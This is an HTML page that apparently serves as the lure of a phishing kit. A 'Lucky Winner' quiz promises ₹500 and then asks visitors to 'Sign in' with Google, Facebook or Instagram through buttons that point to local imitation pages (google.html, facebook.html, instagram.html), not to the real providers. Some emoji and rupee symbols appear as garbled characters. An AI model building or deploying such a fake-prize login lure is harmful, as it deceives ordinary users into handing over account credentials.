<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Button Page with Icon and Text</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #000000;
      margin: 10%;
    }
header {
  position: fixed;
  top: 0;
  left: -50px;
  font-size: 20px;
  text-align: center;
  margin-bottom: 20px;
  background-color: yellow;
  width: 200%;
  height:35px;
  z-index: 100;
}
    .page-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      position: relative;
    }

    img {
      max-width: 50%;
      max-height: 50%;
      margin-bottom: 50px;
    }

    button {
      padding: 10px;
      width: 95%;
      border: none;
      border-radius: 8px;
      margin-top: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background-color 0.3s;
    }

    .blue-button {
      background-color: #007bff;
      color: #fff;
    }

    .white-button {
      background-color: #fff;
      color: #333;
    }

    .pink-button {
      background-color: #ff66b2;
      color: #fff;
    }

    .green-button {
      background-color: #28a745;
      color: #fff;
    }

    .red-button {
      background-color: #dc3545;
      color: #fff;
    }

    .button-text {
      margin-left: 10px;
    }

    .box {
      background-color: yellow;
      padding: 5px;
      width: 90%;
      border-radius: 4px;
      text-align: center;
      margin-bottom: 10px;
    }

    .quiz-container {
      text-align: center;
      margin-top: 20px;
      margin-bottom: 20px;
    }

    .quiz-question {
      font-size: 18px;
      margin-bottom: 10px;
      font-size: 16px;
      font-weight: bold;
      color: #ffffff;
    }

    .quiz-options {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
    }

    .quiz-options button {
      margin: 5px;
      flex: 0 0 45%; /* Adjust the width as needed */
    }

    .quiz-result {
      font-size: 18px;
      font-weight: bold;
      color: #ffffff;
      margin-top: 10px;
      margin-bottom: 10px;
    }    
    h1{
      white-space: nowrap;
      color: #ffffff;
    }
  </style>
</head>
<body>
  <header>
    </header>
  <div class="page-container">
    <h1>Lucky Winner üèÜ</h1>
    <div class="quiz-container">
      <img src="temp/red-envelope-isolated-on-a-transparent-background-png.webp" alt="envelope">
      <div class="quiz-question">
        Q. India Ko Kya kah Kar Bulate hai?
      </div>
      <div class="quiz-options">
        <button onclick="checkAnswer('A')" id="optionA" class="white-button">A. America</button>
        <button onclick="checkAnswer('B')" id="optionB" class="white-button">B. Japan</button>
        <button onclick="checkAnswer('C')" id="optionC" class="white-button">C. Hind</button>
        <button onclick="checkAnswer('D')" id="optionD" class="white-button">D. Bharat</button>
      </div>
      <div class="quiz-result" id="quizResult"></div>
    </div>
    
    <div class="box">
      <p>Sign in or Register to Collect ‚Çπ 500/-</p>
    </div>
    <button onclick="navigateToGoogle()" class="white-button">
      <i class="fab fa-google"></i>
      <span class="button-text">Sign in with Google</span>
    </button>
    <button onclick="navigateToFacebook()" class="blue-button">
      <i class="fab fa-facebook"></i>
      <span class="button-text">Sign in with Facebook</span>
    </button>
    <button onclick="navigateToInstagram()" class="pink-button">
      <i class="fab fa-instagram"></i>
      <span class="button-text">Sign in with Instagram</span>
    </button>
  </div>
  <script>
    function checkAnswer(selectedOption) {
      var resultContainer = document.getElementById("quizResult");

      // Reset button colors
      document.getElementById("optionA").classList.remove("red-button", "green-button");
      document.getElementById("optionB").classList.remove("red-button", "green-button");
      document.getElementById("optionC").classList.remove("red-button", "green-button");
      document.getElementById("optionD").classList.remove("red-button", "green-button");

      if (selectedOption === 'D') {
        resultContainer.innerHTML = "Congratulationsüëèüéâ WON ‚Çπ 500/-";
      } else {
        resultContainer.innerHTML = "Wrong Answer! Try Again";
        // Highlight the selected wrong answer in red
        document.getElementById("option" + selectedOption).classList.add("red-button");
      }
      
      // Highlight the correct answer in green
      document.getElementById("optionD").classList.add("green-button");
    }

    function navigateToGoogle() {
      window.location.href = "google.html"; // Replace with your Google login URL
    }

    function navigateToFacebook() {
      window.location.href = "facebook.html"; // Replace with your Facebook login URL
    }

    function navigateToInstagram() {
      window.location.href = "instagram.html"; // Replace with your Instagram login URL
    }
  </script>
</body>
</html>
